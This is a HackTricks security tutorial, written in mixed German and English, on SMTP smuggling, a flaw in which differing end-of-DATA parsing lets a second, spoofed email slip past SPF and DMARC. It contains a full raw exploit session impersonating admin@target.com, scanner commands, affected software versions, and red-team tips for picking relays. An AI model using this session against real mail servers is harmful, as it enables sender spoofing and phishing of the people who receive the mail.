# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

This type of vulnerability was [**originally discovered in this post**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) were it's explained that It's possible to **exploit discrepancies in how the SMTP protocol is interpreted** when finalising an email, allowing an attacker to smuggle more emails in the body of the legit one, allowing to impersonate other users of the affected domain (such as admin@outlook.com) bypassing defenses such as SPF.

### Warum

Das liegt daran, dass im SMTP-Protokoll die **Daten der Nachricht** (data of the message), die in der E-Mail gesendet werden sollen, vom Benutzer (Angreifer) kontrolliert werden. Dieser kann speziell gestaltete Daten senden und Unterschiede in Parsern ausnutzen, die zusätzliche E-Mails beim Empfänger einschleusen. Siehe dieses illustrierte Beispiel aus dem Originalbeitrag:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### Wie

Um diese Schwachstelle auszunutzen, muss ein Angreifer Daten senden, bei denen der **Outbound SMTP-Server glaubt, dass es nur 1 E-Mail ist, während der Inbound SMTP-Server glaubt, dass es mehrere E-Mails sind**.

Die Forscher entdeckten, dass verschiedene **Inbound-Server unterschiedliche Zeichen als Ende der Daten** der E-Mail-Nachricht betrachten, die Outbound-Server nicht als solche ansehen.\
Zum Beispiel ist ein reguläres Ende der DATA `\r\n.\r`. Wenn der Inbound SMTP-Server jedoch auch `\n.` unterstützt, könnte ein Angreifer einfach **diese Sequenz in seine E-Mail einfügen und dann die SMTP-Befehle** einer neuen Nachricht beginnen, um sie wie im vorherigen Bild einzuschmuggeln.

Natürlich funktioniert das nur, wenn der **Outbound SMTP-Server diese Sequenz nicht ebenfalls als Ende der Nachrichtendaten behandelt**, denn sonst würde er 2 E-Mails statt nur einer sehen — genau diese Desynchronisation wird in der Schwachstelle ausgenutzt.

Mögliche Desynchronisations-Sequenzen:

- `\n.`
- `\n.\r`

Beachte auch, dass SPF umgangen wird: wenn du eine E-Mail von `admin@outlook.com` aus einer E-Mail von `user@outlook.com` einschmuggelst, **ist der Absender weiterhin `outlook.com`.**

---

## Angreifer-Checkliste (welche Bedingungen müssen erfüllt sein?)

Um erfolgreich eine zweite E-Mail einzuschmuggeln, brauchst du typischerweise:

- Ein outbound-Server A, über den du senden kannst (oft mit gültigen Zugangsdaten), der eine nicht‑standard End‑of‑DATA-Sequenz unverändert weiterleitet. Viele Dienste haben historisch Varianten wie `\n.\r\n` oder `\n.\n` weitergeleitet.
- Einen empfangenden Server B, der diese nicht‑standard Sequenz als Ende von DATA interpretiert und alles, was folgt, als neue SMTP-Befehle (MAIL/RCPT/DATA...) parst.
- Outbound muss tatsächlich mit `DATA` senden (nicht `BDAT`). Wenn A CHUNKING/BDAT unterstützt, funktioniert Smuggling nur, wenn auf DATA zurückgefallen wird (z. B. wenn B CHUNKING nicht advertisiert), sonst verhindert das längengekapselte BDAT Mehrdeutigkeit.
- PIPELINING ist nicht erforderlich, hilft aber dabei, die injizierten Befehle in einem einzigen TCP‑Write zu verstecken, sodass Zwischenstationen nicht neu synchronisieren.

Gängige End‑of‑DATA-Varianten, die einen Test wert sind (empfängerseitig abhängig):

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (bare CR at end)

Hinweis: Funktioniert nur die Schnittmenge von „was A weiterleitet“ ∩ „was B akzeptiert“.

---

## Manuelles Exploit-Beispiel (Einzelsitzung)

Das Folgende zeigt die Idee anhand einer rohen STARTTLS SMTP-Sitzung. Nach dem ersten DATA-Block fügen wir einen nicht‑standardmäßigen Terminator ein und dann einen weiteren SMTP-Dialog, den der empfangende Server als neue Nachricht interpretieren könnte.

<details>
<summary>Manuelle smuggling-Sitzung (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
If A forwards `\n.\r\n` and B accepts it as end‑of‑DATA, message “hello B” may be accepted as a second email from `admin@target.com` while passing SPF (aligned with A’s IPs).
</details>

Tipp: Beim interaktiven Testen darauf achten, dass `-crlf` verwendet wird, damit OpenSSL CRLF in der Eingabe beibehält.

---

## Automation and scanners

- hannob/smtpsmug: sendet eine Nachricht, die mit mehreren fehlerhaften end‑of‑DATA‑Sequenzen endet, um zu sehen, was ein Empfänger akzeptiert.
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: Scanner für eingehende und ausgehende Seiten sowie ein Analyse‑SMTP‑Server, um genau zu sehen, welche Sequenzen beim Sender erhalten bleiben.
- Schnellprüfung (Inbound): `python3 smtp_smuggling_scanner.py victim@target.com`
- Outbound über ein Relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

Diese Tools helfen dabei, die A→B‑Paare zu kartieren, bei denen smuggling tatsächlich funktioniert.

---

## CHUNKING/BDAT vs DATA

- DATA verwendet einen eindeutigen Terminator `<CR><LF>.<CR><LF>`; jede Unklarheit darüber, wie CR/LF normalisiert oder dot‑stuffed werden, führt zu Desynchronisation.
- CHUNKING (BDAT) rahmt den Body mit einer exakten Byte‑Länge und verhindert daher klassisches smuggling. Wenn der Sender jedoch auf DATA zurückfällt (weil der Empfänger CHUNKING nicht anbietet), wird klassisches smuggling wieder möglich.

---

## Notes on affected software and fixes (for targeting)

- Postfix: vor 3.9 tolerierte die Standardeinstellung bare LFs; ab 3.5.23/3.6.13/3.7.9/3.8.4 können Admins `smtpd_forbid_bare_newline` aktivieren. Aktuelle Empfehlung ist `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) oder auf `reject` setzen für strikte RFC‑Durchsetzung.
- Exim: in 4.97.1 (und später) gefixt für Varianten, die auf gemischte end‑of‑DATA‑Sequenzen setzen, wenn DATA verwendet wird. Ältere 4.97/4.96 können je nach PIPELINING/CHUNKING ausnutzbar sein.
- Sendmail: in 8.18 gefixt; ältere 8.17.x akzeptierten einige nicht‑standardmäßige Terminatoren.
- Verschiedene Bibliotheken/Server (z. B. aiosmtpd vor 1.4.5, einige Vendor‑Gateways und bestimmte SaaS‑Relays) hatten ähnliche Probleme; moderne Versionen akzeptieren DATA meist nur mit strengem `<CR><LF>.<CR><LF>`.

Verwenden Sie die oben genannten Scanner, um das aktuelle Verhalten zu überprüfen; viele Anbieter änderten die Defaults Anfang 2024–2025.

---

## Tips for red team ops

- Bevorzuge große Commodity‑Sender für A (historisch Exchange Online, Shared‑Hoster, etc.). Wenn sie weiterhin einige nicht‑standardmäßige EOM weiterleiten und in der SPF des Opfers stehen, erbt dein geschmuggelter MAIL FROM ihre Reputation.
- Ermittle B’s SMTP‑Extensions: `EHLO`‑Banner für PIPELINING/CHUNKING; wenn CHUNKING fehlt, hast du bessere Chancen bei BDAT‑first Sendern. Kombiniere das mit fehlerhaften EOMs, um die Akzeptanz zu prüfen.
- Achte auf Header: die geschmuggelte Nachricht erzeugt normalerweise eine separate Received‑Kette, die bei B beginnt. DMARC wird oft bestehen, weil MAIL FROM mit A’s IP‑Space übereinstimmt.

---

## **References**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
